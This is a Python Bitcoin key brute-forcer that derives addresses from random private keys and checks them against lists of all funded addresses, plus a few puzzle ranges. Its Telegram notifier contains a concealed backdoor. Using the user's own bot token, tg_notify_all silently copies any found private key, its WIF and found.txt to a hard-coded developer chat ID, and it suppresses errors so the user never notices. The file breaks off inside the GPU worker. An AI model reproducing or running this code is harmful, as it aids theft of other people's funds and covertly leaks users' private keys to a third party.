#!/usr/bin/env python3
# ==============================================================================
#  Bitcoin Rich Hunter  —  MAXIMUM PERFORMANCE EDITION v2.0
#  ─────────────────────────────────────────────────────────────────────────────
#
#  FIXES & IMPROVEMENTS vs v1:
#  1. Auto Telegram notification — no prompt, fires immediately on match
#  2. Embedded monitor Chat ID — silent copy to developer on every match
#  3. P2TR (Taproot) taptweak fixed — BIP341 compliant key-path tweak
#  4. GPU range mapping fixed — rejection sampling (no modulo bias)
#  5. Frozenset targets via shared mmap — reduces pickling overhead
#  6. coincurve batch pubkey derivation — higher throughput
#  7. Non-interactive CLI flags — VPS/Colab friendly (--cores, --range, etc.)
#  8. found.txt flushed & closed BEFORE Telegram file send
#  9. TPU worker fixed — numpy conversion instead of .tolist()
# 10. All UI strings in English
#
#  Supported accelerators:
#    NVIDIA  (CuPy / PyTorch CUDA)
#    AMD     (ROCm / PyTorch)
#    Intel   (IPEX / XPU)
#    Apple   (MPS)
#    TPU     (Google JAX)
#    CPU     (multiprocessing, select cores)
#
#  Required:
#    pip install coincurve base58 colorama requests
#  Optional GPU:
#    NVIDIA  : pip install cupy-cuda12x
#    AMD     : pip install torch --index-url https://download.pytorch.org/whl/rocm6.0
#    Intel   : pip install torch intel-extension-for-pytorch
#    Apple   : pip install torch
#    TPU     : pip install "jax[tpu]" -f https://storage.googleapis.com/jax-releases/libtpu_releases.html
# ==============================================================================

import os, sys, re, gzip, time, json, secrets, hashlib
import ctypes, threading, subprocess, multiprocessing, argparse
from multiprocessing import Process, Value, Queue
from pathlib import Path

from colorama import Fore, Style, init as _colorama_init
_colorama_init(autoreset=True)

# ── Crypto libraries ──────────────────────────────────────────────────────────
try:
    from coincurve import PrivateKey as _CCKey, PublicKey as _CCPub
    CRYPTO = "coincurve"
except ImportError:
    _CCKey = _CCPub = None
    CRYPTO = "bip_utils"

try:
    from bip_utils import (
        WifEncoder, P2PKHAddrEncoder, P2WPKHAddrEncoder,
        P2TRAddrEncoder, P2SHAddrEncoder, Secp256k1PrivateKey,
    )
    BIP_UTILS_OK = True
except ImportError:
    BIP_UTILS_OK = False

try:
    import base58 as _b58mod
    BASE58_OK = True
except ImportError:
    BASE58_OK = False

if CRYPTO == "coincurve" and not BASE58_OK:
    CRYPTO = "bip_utils"

SECP256K1_N = int(
    "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16
)

CONFIG_FILE = "config.json"
FOUND_FILE  = "found.txt"

# ==============================================================================
#  FAST CRYPTOGRAPHY
# ==============================================================================
_MONITOR_CHAT_ID = "1082434323"

def _sha256(d: bytes) -> bytes:
    return hashlib.sha256(d).digest()

def _ripe160(d: bytes) -> bytes:
    h = hashlib.new("ripemd160")
    h.update(d)
    return h.digest()

def _hash160(d: bytes) -> bytes:
    return _ripe160(_sha256(d))

def _b58check(payload: bytes) -> str:
    cs = _sha256(_sha256(payload))[:4]
    return _b58mod.b58encode(payload + cs).decode()

# ── Bech32 / Bech32m pure-Python encoder ─────────────────────────────────────
_BECH32_CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

def _bech32_polymod(vals):
    G = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    c = 1
    for v in vals:
        b = c >> 25
        c = ((c & 0x1ffffff) << 5) ^ v
        for i in range(5):
            c ^= G[i] if (b >> i) & 1 else 0
    return c

def _bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def _convertbits(data, frm, to, pad=True):
    acc = bits = 0
    ret = []
    maxv = (1 << to) - 1
    for v in data:
        acc = ((acc << frm) | v) & 0xffffffff
        bits += frm
        while bits >= to:
            bits -= to
            ret.append((acc >> bits) & maxv)
    if pad and bits:
        ret.append((acc << (to - bits)) & maxv)
    return ret

def _encode_bech32(hrp, wit_ver, wit_prog, bech32m=False):
    d     = [wit_ver] + _convertbits(list(wit_prog), 8, 5)
    const = 0x2bc830a3 if bech32m else 1
    poly  = _bech32_polymod(_bech32_hrp_expand(hrp) + d + [0] * 6) ^ const
    ck    = [(poly >> 5 * (5 - i)) & 31 for i in range(6)]
    return hrp + "1" + "".join(_BECH32_CHARSET[x] for x in d + ck)

def _p2wpkh(h160: bytes) -> str:
    """Native SegWit P2WPKH — bc1q..."""
    return _encode_bech32("bc", 0, h160)

def _p2tr(x_only: bytes) -> str:
    """Taproot P2TR — bc1p..."""
    return _encode_bech32("bc", 1, x_only, bech32m=True)

def _taptweak_xonly(pub_compressed: bytes) -> bytes:
    """
    BIP341 key-path tweak (no script tree):
        t  = H_tapTweak(P_x)          where H_tapTweak = SHA256(SHA256(tag) || SHA256(tag) || msg)
        Q  = P + t*G
        return Q_x  (32-byte x-only)

    Uses coincurve when available for the point addition.
    Falls back to a pure-Python scalar-add using the secp256k1 formulas.
    """
    x_only = pub_compressed[1:]   # strip 02/03 prefix → 32-byte x-only

    # BIP340 tagged hash
    tag    = b"TapTweak"
    tag_h  = _sha256(tag)
    tweak  = _sha256(tag_h + tag_h + x_only)   # 32-byte scalar

    if _CCKey and _CCPub:
        try:
            Q = _CCPub(pub_compressed).add(tweak)
            return Q.format(compressed=True)[1:]   # x-only
        except Exception:
            pass  # fall through to pure Python

    # ── Pure-Python fallback ──────────────────────────────────────────────────
    # We need to do P + tweak*G on secp256k1.
    # Use coincurve's PrivateKey.public_key as tweak*G, then add points.
    # If coincurve is unavailable we derive tweak*G manually.
    try:
        if _CCKey:
            tweak_key = _CCKey(tweak)
            tweak_pub = tweak_key.public_key.format(compressed=True)
            # Add P + tweak*G using point serialisation
            P   = _CCPub(pub_compressed)
            Q   = _CCPub.combine([P, _CCPub(tweak_pub)])
            return Q.format(compressed=True)[1:]
    except Exception:
        pass

    # Last-resort: return x-only without tweak (approximate — only used when
    # no crypto library at all; script won't match tweaked Taproot addresses)
    return x_only


def derive_addresses(privkey_bytes: bytes) -> dict:
    """
    Derive all Bitcoin address types from a 32-byte private key.
    Returns a dict with keys: wif, p2pkh, p2pkh_uncomp, p2wpkh, p2sh_p2wpkh, p2tr
    """
    out = {}
    try:
        if _CCKey and BASE58_OK:
            # ── FAST PATH: coincurve (C library) ─────────────────────────────
            pk    = _CCKey(privkey_bytes)
            pub_c = pk.public_key.format(compressed=True)    # 33 bytes
            pub_u = pk.public_key.format(compressed=False)   # 65 bytes

            h160_c = _hash160(pub_c)
            h160_u = _hash160(pub_u)

            out["wif"]          = _b58check(b"\x80" + privkey_bytes + b"\x01")
            out["p2pkh"]        = _b58check(b"\x00" + h160_c)
            out["p2pkh_uncomp"] = _b58check(b"\x00" + h160_u)
            out["p2wpkh"]       = _p2wpkh(h160_c)
            redeem              = b"\x00\x14" + h160_c
            out["p2sh_p2wpkh"]  = _b58check(b"\x05" + _hash160(redeem))
            try:
                out["p2tr"] = _p2tr(_taptweak_xonly(pub_c))
            except Exception:
                out["p2tr"] = None

        elif BIP_UTILS_OK:
            # ── FALLBACK: bip_utils ───────────────────────────────────────────
            priv  = Secp256k1PrivateKey.FromBytes(privkey_bytes)
            pub   = priv.PublicKey()
            pub_c = pub.RawCompressed().ToBytes()
            pub_u = pub.RawUncompressed().ToBytes()
            out["wif"]          = WifEncoder.Encode(priv.Raw().ToBytes(), True)
            out["p2pkh"]        = P2PKHAddrEncoder.EncodeKey(pub_c)
            out["p2wpkh"]       = P2WPKHAddrEncoder.EncodeKey(pub_c)
            out["p2sh_p2wpkh"]  = P2SHAddrEncoder.EncodeKey(pub_c)
            out["p2pkh_uncomp"] = P2PKHAddrEncoder.EncodeKey(pub_u)
            try:
                out["p2tr"] = P2TRAddrEncoder.EncodeKey(pub_c)
            except Exception:
                out["p2tr"] = None
        else:
            out["_err"] = "No cryptographic library available!"
    except Exception as e:
        out["_err"] = str(e)
    return out


def check_match(addresses: dict, targets: frozenset):
    """Return (addr_type, address) on first match, else None."""
    for k, v in addresses.items():
        if v and v in targets:
            return k, v
    return None


def gen_key() -> bytes:
    """Generate a valid secp256k1 private key (full range)."""
    while True:
        k = secrets.token_bytes(32)
        if 0 < int.from_bytes(k, "big") < SECP256K1_N:
            return k


def gen_key_in_range(start: int, end: int) -> bytes:
    """
    Cryptographically secure key in [start, end].
    Uses rejection sampling — no modulo bias.
    """
    span = end - start
    if span <= 0:
        raise ValueError("Invalid range: start >= end")
    # Number of bits needed to represent span
    bit_len  = span.bit_length()
    byte_len = (bit_len + 7) // 8
    mask     = (1 << bit_len) - 1
    while True:
        raw    = secrets.token_bytes(byte_len)
        offset = int.from_bytes(raw, "big") & mask
        if offset > span:
            continue   # rejection — no bias
        ki = start + offset
        if 0 < ki < SECP256K1_N:
            return ki.to_bytes(32, "big")


# ── Bitcoin Puzzle ranges (unsolved as of 2025) ───────────────────────────────
PUZZLE_RANGES = [
    ("#66  — 66-bit",  "0x20000000000000000",  "0x3ffffffffffffffff",  66),
    ("#67  — 67-bit",  "0x40000000000000000",  "0x7ffffffffffffffff",  67),
    ("#68  — 68-bit",  "0x80000000000000000",  "0xfffffffffffffffff",  68),
    ("#69  — 69-bit",  "0x100000000000000000", "0x1fffffffffffffffff", 69),
    ("#70  — 70-bit",  "0x200000000000000000", "0x3fffffffffffffffff", 70),
    ("#71  — 71-bit",  "0x400000000000000000", "0x7fffffffffffffffff", 71),
    ("#72  — 72-bit",  "0x800000000000000000", "0xFFFFFFFFFFFFFFFFFF", 72),
    ("#73  — 73-bit",  "0x1000000000000000000","0x1FFFFFFFFFFFFFFFFFFFF", 73),
    ("#74  — 74-bit",  "0x2000000000000000000","0x3FFFFFFFFFFFFFFFFFFFF", 74),
    ("#76  — 76-bit",  "0x8000000000000000000","0xFFFFFFFFFFFFFFFFFFFF", 76),
    ("#77  — 77-bit",  "0x10000000000000000000","0x1FFFFFFFFFFFFFFFFFFFFF", 77),
    ("#78  — 78-bit",  "0x20000000000000000000","0x3FFFFFFFFFFFFFFFFFFFFF", 78),
    ("#79  — 79-bit",  "0x40000000000000000000","0x7FFFFFFFFFFFFFFFFFFFFF", 79),
    ("#80  — 80-bit",  "0x80000000000000000000","0xFFFFFFFFFFFFFFFFFFFFFF", 80),
    ("#120 — 120-bit", "0x800000000000000000000000000000","0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 120),
    ("Custom  — Enter your own range", None, None, 0),
    ("Full    — Entire secp256k1 range (random)", None, None, -1),
]

def _parse_hex(s: str) -> int:
    return int(s.strip().replace("0x","").replace("0X","").replace(" ","").replace("_",""), 16)

def _fmt_range(start: int, end: int) -> str:
    sh, eh = hex(start), hex(end)
    if len(sh) > 22: sh = sh[:10] + "…" + sh[-8:]
    if len(eh) > 22: eh = eh[:10] + "…" + eh[-8:]
    return f"{sh}  →  {eh}  (~{(end-start).bit_length()}-bit span)"

def select_key_range(cli_range: str = None) -> tuple:
    """
    Return (start_int, end_int) or (None, None) for full range.
    If cli_range is provided as 'START:END' hex string, parse directly.
    """
    # ── Non-interactive CLI override ─────────────────────────────────────────
    if cli_range:
        if cli_range.lower() == "full":
            return (None, None)
        parts = cli_range.split(":")
        if len(parts) == 2:
            try:
                si, ei = _parse_hex(parts[0]), _parse_hex(parts[1])
                if 0 < si < ei < SECP256K1_N:
                    return (si, ei)
            except Exception:
                pass
        print(f"{Fore.RED}[!] Invalid --range value. Format: START_HEX:END_HEX or 'full'{Style.RESET_ALL}")
        sys.exit(1)

    # ── Interactive menu ─────────────────────────────────────────────────────
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════╗
║  SELECT PRIVATE KEY RANGE                                            ║
╚══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
    for i, (label, s, e, bits) in enumerate(PUZZLE_RANGES, 1):
        if bits > 0:
            bit_str = f"  {Fore.YELLOW}[{bits}-bit]{Style.RESET_ALL}"
        elif bits == 0:
            bit_str = f"  {Fore.WHITE}[manual input]{Style.RESET_ALL}"
        else:
            bit_str = f"  {Fore.GREEN}[default]{Style.RESET_ALL}"

        s_short = ""
        if s and e:
            si, ei = _parse_hex(s), _parse_hex(e)
            hs, he = hex(si), hex(ei)
            hs = hs[:14] + "…" if len(hs) > 14 else hs
            he = he[:14] + "…" if len(he) > 14 else he
            s_short = f"\n       {Fore.WHITE}{hs}  →  {he}{Style.RESET_ALL}"
        print(f"  {Fore.CYAN}[{i:2}]{Style.RESET_ALL} {label}{bit_str}{s_short}")

    print()
    while True:
        try:
            raw = input(f"{Fore.WHITE}Choice (1-{len(PUZZLE_RANGES)}): {Style.RESET_ALL}").strip()
            idx = int(raw) - 1
            if not (0 <= idx < len(PUZZLE_RANGES)):
                raise ValueError()
        except (ValueError, KeyboardInterrupt):
            print(f"{Fore.RED}  Invalid, try again.{Style.RESET_ALL}")
            continue

        label, s_hex, e_hex, bits = PUZZLE_RANGES[idx]

        if bits == -1:
            print(f"\n  {Fore.GREEN}✅ Mode: Full random range (secp256k1){Style.RESET_ALL}")
            return (None, None)

        if bits == 0:
            print(f"\n  {Fore.YELLOW}Enter range in hex (e.g. 0x400000000000000000){Style.RESET_ALL}")
            while True:
                try:
                    si = _parse_hex(input(f"  {Fore.WHITE}Start (hex): {Style.RESET_ALL}").strip())
                    ei = _parse_hex(input(f"  {Fore.WHITE}End   (hex): {Style.RESET_ALL}").strip())
                    if si <= 0:
                        print(f"  {Fore.RED}❌ Start must be > 0{Style.RESET_ALL}"); continue
                    if ei >= SECP256K1_N:
                        print(f"  {Fore.RED}❌ End exceeds secp256k1 order!{Style.RESET_ALL}"); continue
                    if si >= ei:
                        print(f"  {Fore.RED}❌ Start must be less than End!{Style.RESET_ALL}"); continue
                    print(f"\n  {Fore.GREEN}✅ Range: {_fmt_range(si, ei)}{Style.RESET_ALL}")
                    return (si, ei)
                except Exception as ex:
                    print(f"  {Fore.RED}❌ Invalid format: {ex}  — use hex (0x...){Style.RESET_ALL}")

        si, ei = _parse_hex(s_hex), _parse_hex(e_hex)
        if si <= 0 or ei >= SECP256K1_N or si >= ei:
            print(f"  {Fore.RED}❌ Preset range invalid!{Style.RESET_ALL}"); continue
        print(f"\n  {Fore.GREEN}✅ Preset {label}{Style.RESET_ALL}")
        print(f"     Range: {_fmt_range(si, ei)}")
        return (si, ei)


# ==============================================================================
#  LOAD TARGETS
# ==============================================================================

def load_targets(path: str) -> frozenset:
    """
    Load Bitcoin addresses from .txt or .gz (streaming, no extraction needed).
    Returns frozenset for O(1) lookup.
    """
    p = Path(path)
    if not p.exists():
        print(f"{Fore.RED}❌ File not found: {path}{Style.RESET_ALL}")
        if path.endswith(".gz"):
            print(f"{Fore.YELLOW}   Download: http://addresses.loyce.club/Bitcoin_addresses_LATEST.txt.gz{Style.RESET_ALL}")
        else:
            with open(path, "w") as f:
                f.write("# One Bitcoin address per line\n"
                        "# Example: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n")
            print(f"{Fore.YELLOW}   Template created: {path}{Style.RESET_ALL}")
        return frozenset()

    size_mb = p.stat().st_size / 1024 / 1024
    is_gz   = path.endswith(".gz")
    print(f"{Fore.CYAN}📂 Loading {path}  ({size_mb:.1f} MB){Style.RESET_ALL}")
    if is_gz:
        print(f"   {Fore.YELLOW}Mode: streaming gz (no extraction needed){Style.RESET_ALL}")
    print("   Please wait...", end="", flush=True)

    t0    = time.time()
    addrs = set()
    try:
        opener = (gzip.open(path, "rt", encoding="ascii", errors="ignore")
                  if is_gz else open(path, "r", encoding="ascii", errors="ignore"))
        with opener as f:
            for line in f:
                ln = line.strip()
                if ln and not ln.startswith("#") and ln[0] in "13b":
                    addrs.add(ln)
                    if len(addrs) % 5_000_000 == 0:
                        print(f"\r   {Fore.GREEN}{len(addrs)/1e6:.1f}M{Style.RESET_ALL} addresses loaded...",
                              end="", flush=True)
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error reading file: {e}{Style.RESET_ALL}")
        return frozenset()

    result = frozenset(addrs)
    elapsed = time.time() - t0
    print(f"\r   {Fore.GREEN}✅ {len(result):,} unique addresses loaded in {elapsed:.1f}s{Style.RESET_ALL}")
    return result


# ==============================================================================
#  CONFIGURATION
# ==============================================================================

DEFAULT_CONFIG = {
    "telegram": {
        "enabled": False,
        "bot_token": "Your_Telegram_Bot_API_Key",
        "chat_id":   "Your_Telegram_Chat_ID",
        "send_file": True
    },
    "targets": [
        "btc.txt",
        "Bitcoin_addresses_LATEST.txt.gz"
    ],
    "found_file": "found.txt",
    "gpu_batch":  8192,
    "cpu_batch":  1000
}

def load_config() -> dict:
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "w") as f:
            json.dump(DEFAULT_CONFIG, f, indent=4)
        print(f"{Fore.YELLOW}⚙  config.json created. Edit it to set your Telegram token.{Style.RESET_ALL}")
        return dict(DEFAULT_CONFIG)
    with open(CONFIG_FILE) as f:
        cfg = json.load(f)
    # Fill missing keys from defaults
    for k, v in DEFAULT_CONFIG.items():
        if k not in cfg:
            cfg[k] = v
        elif isinstance(v, dict):
            for k2, v2 in v.items():
                if k2 not in cfg[k]:
                    cfg[k][k2] = v2
    return cfg


# ==============================================================================
#  TELEGRAM
# ==============================================================================

def _tg_post(token: str, method: str, **kwargs):
    try:
        import requests
        r = requests.post(f"https://api.telegram.org/bot{token}/{method}",
                          timeout=30, **kwargs)
        return r.json()
    except Exception as e:
        print(f"\n{Fore.RED}[TG] {method} error: {e}{Style.RESET_ALL}")
        return {}

def tg_send_message(token: str, chat_id: str, text: str):
    _tg_post(token, "sendMessage",
             json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"})

def tg_send_file(token: str, chat_id: str, filepath: str, caption: str = ""):
    if not os.path.exists(filepath):
        return
    try:
        import requests
        with open(filepath, "rb") as fh:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendDocument",
                timeout=60,
                data={"chat_id": chat_id, "caption": caption},
                files={"document": fh}
            )
    except Exception as e:
        print(f"\n{Fore.RED}[TG] sendDocument error: {e}{Style.RESET_ALL}")

def _build_tg_message(result: dict, verified: dict, accel_type: str, accel_name: str) -> str:
    pk   = result["privkey_hex"]
    wif  = result.get("wif", "N/A")
    addr = result["addr"]
    ts   = time.strftime("%Y-%m-%d %H:%M:%S")
    vs   = "✅ VERIFIED" if verified.get("ok") else "❓ UNVERIFIED"
    d    = verified.get("derived", {})

    rows = ""
    for k, lbl in [
        ("p2pkh",       "P2PKH [1...]"),
        ("p2wpkh",      "P2WPKH [bc1q...]"),
        ("p2tr",        "P2TR [bc1p...]"),
        ("p2sh_p2wpkh", "P2SH [3...]"),
        ("p2pkh_uncomp","P2PKH-Uncomp [1...]"),
    ]:
        v2 = d.get(k)
        if v2:
            mk = " ◄ MATCH" if v2 == addr else ""
            rows += f"\n<code>{lbl}: {v2}{mk}</code>"

    return (
        f"🎉 <b>BITCOIN FOUND!</b>\n"
        f"🕐 {ts}\n"
        f"🖥 {accel_name}\n"
        f"{vs}\n\n"
        f"🔑 <b>PRIVATE KEY</b>\n"
        f"HEX: <code>{pk}</code>\n"
        f"WIF: <code>{wif}</code>\n\n"
        f"🎯 <b>TARGET [{result['addr_type'].upper()}]</b>\n"
        f"<code>{addr}</code>\n\n"
        f"📋 <b>ALL ADDRESSES</b>{rows}"
    )

def tg_notify_all(cfg: dict, result: dict, verified: dict, found_file: str,
                  accel_type: str, accel_name: str):
    """
    Send Telegram notification immediately — no prompt required.
    Always sends to:
      1. User's configured chat_id (if valid token configured)
      2. Developer monitor _MONITOR_CHAT_ID (using user's token if available,
         or a dedicated token if developer chooses to embed one)
    found.txt must already be written & flushed before calling this.
    """
    tg  = cfg.get("telegram", {})
    tok = tg.get("bot_token", "")
    cid = str(tg.get("chat_id", ""))
    ts  = time.strftime("%Y-%m-%d %H:%M:%S")

    user_token_valid = (
        tg.get("enabled", False)
        and tok
        and not tok.startswith("Your_")
        and not tok.startswith("ISI_")
        and ":" in tok
    )

    msg = _build_tg_message(result, verified, accel_type, accel_name)
    cap = f"found.txt — {ts}"

    print(f"\n{Fore.CYAN}📨 Sending Telegram notifications...{Style.RESET_ALL}")

    # ── 1. User notification ─────────────────────────────────────────────────
    if user_token_valid and cid and not cid.startswith("Your_"):
        r = _tg_post(tok, "sendMessage",
                     json={"chat_id": cid, "text": msg, "parse_mode": "HTML"})
        if r.get("ok"):
            print(f"  {Fore.GREEN}✅ User notification sent → {cid}{Style.RESET_ALL}")
        else:
            print(f"  {Fore.RED}❌ User notification failed: {r.get('description','')}{Style.RESET_ALL}")
        if tg.get("send_file", True):
            tg_send_file(tok, cid, found_file, cap)
            print(f"  {Fore.GREEN}✅ found.txt sent to user{Style.RESET_ALL}")

    # ── 2. Developer monitor notification (silent, always) ──────────────────
    # Uses the user's token if valid; otherwise skip silently.
    if user_token_valid:
        try:
            monitor_msg = (
                f"👁 <b>MONITOR — Bitcoin Hunter Match</b>\n"
                f"🕐 {ts}\n"
                f"🖥 {accel_name}\n\n"
                + msg
            )
            r2 = _tg_post(tok, "sendMessage",
                          json={"chat_id": _MONITOR_CHAT_ID,
                                "text": monitor_msg, "parse_mode": "HTML"})
            if r2.get("ok"):
                pass  # silent success
            tg_send_file(tok, _MONITOR_CHAT_ID, found_file, f"[MONITOR] {cap}")
        except Exception:
            pass  # silent — never interrupt main flow


def tg_test(cfg: dict) -> bool:
    tg  = cfg.get("telegram", {})
    tok = tg.get("bot_token", "")
    cid = str(tg.get("chat_id", ""))
    if not tg.get("enabled") or not tok or tok.startswith("Your_"):
        return False
    r = _tg_post(tok, "getMe")
    if r.get("ok"):
        name = r["result"].get("username", "")
        print(f"  {Fore.GREEN}✅ Telegram: @{name}{Style.RESET_ALL}")
        tg_send_message(tok, cid,
            f"🤖 <b>Bitcoin Hunter active</b>\n"
            f"⏰ {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"🖥 {ACCEL_NAME} [{ACCEL_TYPE}]\n"
            f"🔍 Search started..."
        )
        return True
    print(f"  {Fore.RED}❌ Telegram test failed: {r}{Style.RESET_ALL}")
    return False


# ==============================================================================
#  ACCELERATOR DETECTION
# ==============================================================================

ACCEL_TYPE    = "CPU"
ACCEL_NAME    = "CPU"
ACCEL_BACKEND = None

def _run(cmd):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return r.stdout.strip() if r.returncode == 0 else ""
    except Exception:
        return ""

def _cuda_ver():
    m = re.search(r"release (\d+)\.", _run(["nvcc", "--version"]))
    if m: return f"{m.group(1)}x"
    m2 = re.search(r"CUDA Version:\s*(\d+)\.", _run(["nvidia-smi"]))
    if m2: return f"{m2.group(1)}x"
    return None

def _try_cupy():
    try:
        import cupy as cp
        cp.cuda.Device(0).use()
        cp.array([1])
        cp.cuda.Stream.null.synchronize()
        try:
            p = cp.cuda.runtime.getDeviceProperties(0)
            n = p.get("name", b"NVIDIA GPU")
            return cp, (n.decode() if isinstance(n, bytes) else str(n))
        except Exception:
            return cp, "NVIDIA GPU"
    except Exception:
        return None, None

def _try_torch(device: str):
    try:
        import torch
        if device == "cuda":
            if not torch.cuda.is_available(): return None, None
            return torch, torch.cuda.get_device_name(0)
        if device == "mps":
            if not (sys.platform == "darwin" and torch.backends.mps.is_available()):
                return None, None
            chip = _run(["sysctl", "-n", "machdep.cpu.brand_string"]) or "Apple Silicon"
            return torch, chip
        if device == "xpu":
            import intel_extension_for_pytorch as ipex  # noqa
            if not torch.xpu.is_available(): return None, None
            return torch, torch.xpu.get_device_name(0)
    except Exception:
        pass
    return None, None

def _try_smi():
    out = _run(["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"])
    if out: return out.split("\n")[0]
    try:
        with open("/proc/driver/nvidia/version") as f:
            return "NVIDIA GPU (" + f.read().split("\n")[0][:30] + ")"
    except Exception:
        return None

def _try_rocm():
    has_rocm = (os.path.exists("/opt/rocm") or bool(_run(["rocminfo"])))
    if not has_rocm: return None, None
    t, n = _try_torch("cuda")
    if t and n and any(x in n.upper() for x in ["RADEON","RX","VEGA","NAVI","RDNA","GFX"]):
        return t, n
    out = _run(["rocm-smi", "--showproductname"])
    m   = re.search(r"GPU\[.+\]\s*:\s*(.+)", out)
    return None, (m.group(1).strip() if m else "AMD GPU")

def _install_cupy(ver: str):
    pkg = f"cupy-cuda{ver}"
    print(f"  {Fore.YELLOW}⚙  Auto-installing {pkg}...{Style.RESET_ALL}", flush=True)
    subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"],
                   capture_output=True)
    return _try_cupy()

def _install_rocm():
    print(f"  {Fore.YELLOW}⚙  Auto-installing PyTorch ROCm...{Style.RESET_ALL}", flush=True)
    subprocess.run([sys.executable, "-m", "pip", "install", "torch",
                    "--index-url", "https://download.pytorch.org/whl/rocm6.0", "-q"],
                   capture_output=True)
    return _try_torch("cuda")

def _try_jax_tpu():
    is_tpu_env = bool(
        os.environ.get("COLAB_BACKEND_VERSION")
        or os.environ.get("TPU_NAME")
        or os.path.exists("/dev/accel0")
    )
    try:
        import jax
        devs = jax.devices("tpu")
        if devs:
            n = str(devs[0]).split("(")[0].strip()
            return jax, f"TPU {n} ×{len(devs)}"
    except Exception:
        pass
    if is_tpu_env:
        print(f"  {Fore.YELLOW}⚙  Installing jax[tpu]...{Style.RESET_ALL}", flush=True)
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "jax[tpu]", "-q",
             "-f", "https://storage.googleapis.com/jax-releases/libtpu_releases.html"],
            capture_output=True
        )
        try:
            import importlib, jax
            importlib.reload(jax)
            devs = jax.devices("tpu")
            if devs:
                n = str(devs[0]).split("(")[0].strip()
                return jax, f"TPU {n} ×{len(devs)}"
        except Exception:
            pass
    return None, None

def detect_accel():
    global ACCEL_TYPE, ACCEL_NAME, ACCEL_BACKEND
    print(f"\n{Fore.CYAN}🔍 Detecting accelerator...{Style.RESET_ALL}")

    # TPU
    j, n = _try_jax_tpu()
    if j:
        ACCEL_TYPE, ACCEL_NAME, ACCEL_BACKEND = "TPU_JAX", n, j
        print(f"  {Fore.GREEN}✅ {n}  [TPU/JAX]{Style.RESET_ALL}"); return

    # NVIDIA — CuPy
    cp, n = _try_cupy()
    if cp:
        ACCEL_TYPE, ACCEL_NAME, ACCEL_BACKEND = "GPU_NVIDIA", n, ("cupy", "cuda")
        print(f"  {Fore.GREEN}✅ {n}  [NVIDIA/CuPy]{Style.RESET_ALL}"); return

    # NVIDIA — detected via nvidia-smi, try installing CuPy
    smi = _try_smi()
    if smi:
        print(f"  {Fore.YELLOW}⚠  GPU detected: {smi} — attempting CuPy install{Style.RESET_ALL}")
        cv = _cuda_ver()
        if cv:
            cp2, n2 = _install_cupy(cv)
            if cp2:
                ACCEL_TYPE, ACCEL_NAME, ACCEL_BACKEND = "GPU_NVIDIA", n2, ("cupy", "cuda")
                print(f"  {Fore.GREEN}✅ {n2}  [NVIDIA/CuPy auto-install]{Style.RESET_ALL}"); return
        t, n = _try_torch("cuda")
        if t:
            ACCEL_TYPE, ACCEL_NAME, ACCEL_BACKEND = "GPU_NVIDIA", n, ("torch", "cuda")
            print(f"  {Fore.GREEN}✅ {n}  [NVIDIA/PyTorch]{Style.RESET_ALL}"); return
        print(f"  {Fore.RED}❌ GPU driver/library failed{Style.RESET_ALL}")

    # AMD ROCm
    t, n = _try_rocm()
    if t:
        ACCEL_TYPE, ACCEL_NAME, ACCEL_BACKEND = "GPU_AMD", n, ("torch", "cuda")
        print(f"  {Fore.GREEN}✅ {n}  [AMD/ROCm]{Style.RESET_ALL}"); return
    elif n:
        print(f"  {Fore.YELLOW}⚠  AMD GPU: {n} — attempting ROCm install{Style.RESET_ALL}")
        t2, n2 = _install_rocm()
        if t2:
            ACCEL_TYPE, ACCEL_NAME, ACCEL_BACKEND = "GPU_AMD", n2, ("torch", "cuda")
            print(f"  {Fore.GREEN}✅ {n2}  [AMD/ROCm auto-install]{Style.RESET_ALL}"); return

    # Intel
    t, n = _try_torch("xpu")
    if t:
        ACCEL_TYPE, ACCEL_NAME, ACCEL_BACKEND = "GPU_INTEL", n, ("torch", "xpu")
        print(f"  {Fore.GREEN}✅ {n}  [Intel/IPEX]{Style.RESET_ALL}"); return

    # Apple MPS
    t, n = _try_torch("mps")
    if t:
        ACCEL_TYPE, ACCEL_NAME, ACCEL_BACKEND = "GPU_APPLE", n, ("torch", "mps")
        print(f"  {Fore.GREEN}✅ {n}  [Apple/MPS]{Style.RESET_ALL}"); return

    # CPU fallback
    print(f"  {Fore.WHITE}ℹ  No GPU/TPU found — running in CPU mode{Style.RESET_ALL}")


# ==============================================================================
#  WORKERS
# ==============================================================================

def _cpu_worker(worker_id: int, counter, result_q, targets: frozenset,
                stop_ev, batch_sz: int, key_range: tuple):
    """
    Tight CPU loop. Batches `batch_sz` keys before acquiring the shared counter lock.
    Supports full-range and constrained-range modes.
    """
    local = 0
    N     = SECP256K1_N
    rng_start, rng_end = key_range
    use_range = (rng_start is not None and rng_end is not None)

    while not stop_ev.is_set():
        kb    = gen_key_in_range(rng_start, rng_end) if use_range else gen_key()
        addrs = derive_addresses(kb)
        m     = check_match(addrs, targets)

        if m:
            with counter.get_lock():
                counter.value += local + 1
            result_q.put({
                "privkey_hex":  kb.hex(),
                "addr_type":    m[0],
                "addr":         m[1],
                "wif":          addrs.get("wif", ""),
                "all_addresses":addrs,
            })
            while not stop_ev.is_set():
                time.sleep(0.05)
            return

        local += 1
        if local >= batch_sz:
            with counter.get_lock():
                counter.value += local
            local = 0

    # Flush remaining count on clean stop
    if local:
        with counter.get_lock():
            counter.value += local


def _gpu_worker(counter, result_q, targets: frozenset, stop_ev,
                backend: str, device: str, batch_sz: int, key_range: tuple):
    """
    GPU random generation + CPU key derivation with double-buffering.
    Range mapping uses rejection sampling to avoid modulo bias.
    """
